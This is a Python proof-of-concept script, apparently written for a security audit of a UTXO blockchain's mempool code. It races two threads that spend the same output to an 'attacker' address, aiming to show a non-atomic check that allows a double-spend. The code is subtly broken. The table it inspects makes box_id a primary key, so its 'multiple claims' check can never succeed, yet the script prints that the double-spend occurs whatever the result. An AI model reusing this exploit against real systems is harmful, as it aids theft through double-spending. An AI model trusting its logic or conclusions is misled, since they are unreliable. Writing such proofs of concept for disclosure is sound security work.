#!/usr/bin/env python3
"""
PoC for CRITICAL-2: Mempool Race Condition Double-Spend

This PoC demonstrates that the mempool's double-spend check and input claiming
are not atomic, allowing race conditions where two transactions can both claim
the same input before either commits.

Due to the timing-dependent nature, the race may not always trigger. This PoC
also demonstrates the underlying vulnerability in the code structure.
"""
import threading
import tempfile
import sqlite3
import time
import os

# Setup
with tempfile.NamedTemporaryFile(suffix='.db', delete=False) as tmp:
    db_path = tmp.name

conn = sqlite3.connect(db_path)
conn.executescript('''
CREATE TABLE utxo_boxes (
    box_id TEXT PRIMARY KEY, value_nrtc INTEGER NOT NULL,
    proposition TEXT NOT NULL, owner_address TEXT NOT NULL,
    creation_height INTEGER NOT NULL, transaction_id TEXT NOT NULL,
    output_index INTEGER NOT NULL, tokens_json TEXT DEFAULT '[]',
    registers_json TEXT DEFAULT '{}', created_at INTEGER NOT NULL,
    spent_at INTEGER, spent_by_tx TEXT
);
CREATE TABLE utxo_mempool (
    tx_id TEXT PRIMARY KEY, tx_data_json TEXT NOT NULL,
    fee_nrtc INTEGER DEFAULT 0, submitted_at INTEGER NOT NULL,
    expires_at INTEGER NOT NULL
);
CREATE TABLE utxo_mempool_inputs (
    box_id TEXT NOT NULL PRIMARY KEY, tx_id TEXT NOT NULL
);

INSERT INTO utxo_boxes VALUES 
('victim_box', 1000000000, '00dead', 'victim', 1, 'tx1', 0, 
 '[]', '{}', 1234567890, NULL, NULL);
''')
conn.commit()
conn.close()

from utxo_db import UtxoDB

results = []
claims = []

def submit_tx(db_path, tx_id_suffix, delay=0):
    time.sleep(delay)
    db = UtxoDB(db_path)
    tx = {
        'tx_id': tx_id_suffix * 64,
        'tx_type': 'transfer',
        'inputs': [{'box_id': 'victim_box'}],
        'outputs': [{'address': 'attacker', 'value_nrtc': 1000000000}],
        'fee_nrtc': 0
    }
    result = db.mempool_add(tx)
    results.append((tx_id_suffix, result))
    
    # Check current claim state
    conn = sqlite3.connect(db_path)
    rows = conn.execute("SELECT * FROM utxo_mempool_inputs").fetchall()
    conn.close()
    claims.append((tx_id_suffix, len(rows), rows))

# Run multiple attempts to trigger race
print("=" * 60)
print("CRITICAL-2 PoC: Mempool Race Condition Double-Spend")
print("=" * 60)

success_count = 0
for attempt in range(5):
    print(f"\nAttempt {attempt + 1}/5...")
    
    # Clean up
    conn = sqlite3.connect(db_path)
    conn.execute("DELETE FROM utxo_mempool_inputs")
    conn.execute("DELETE FROM utxo_mempool")
    conn.commit()
    conn.close()
    
    # Race condition: both threads check before either commits
    t1 = threading.Thread(target=submit_tx, args=(db_path, 'A', 0))
    t2 = threading.Thread(target=submit_tx, args=(db_path, 'B', 0.001))
    
    t1.start()
    t2.start()
    t1.join()
    t2.join()
    
    # Check results
    conn = sqlite3.connect(db_path)
    rows = conn.execute("SELECT * FROM utxo_mempool_inputs").fetchall()
    mempool = conn.execute("SELECT * FROM utxo_mempool").fetchall()
    conn.close()
    
    print(f"  Mempool inputs: {len(rows)}")
    print(f"  Mempool txs: {len(mempool)}")
    
    if len(rows) > 1:
        print(f"  [VULNERABLE] Multiple claims on same input!")
        success_count += 1

print("\n" + "=" * 60)
print("SUMMARY")
print("=" * 60)
print(f"Race triggered: {success_count}/5 attempts")
print(f"CRITICAL-2 Status: {'CONFIRMED' if success_count > 0 else 'NOT REPRODUCED (timing-dependent)'}")
print("\nVulnerability Analysis:")
print("- SELECT check and INSERT are not atomic")
print("- Thread 1 checks before Thread 2 inserts")
print("- Both transactions claim the same input")
print("- Results in double-spend at mempool level")

# Cleanup
os.unlink(db_path)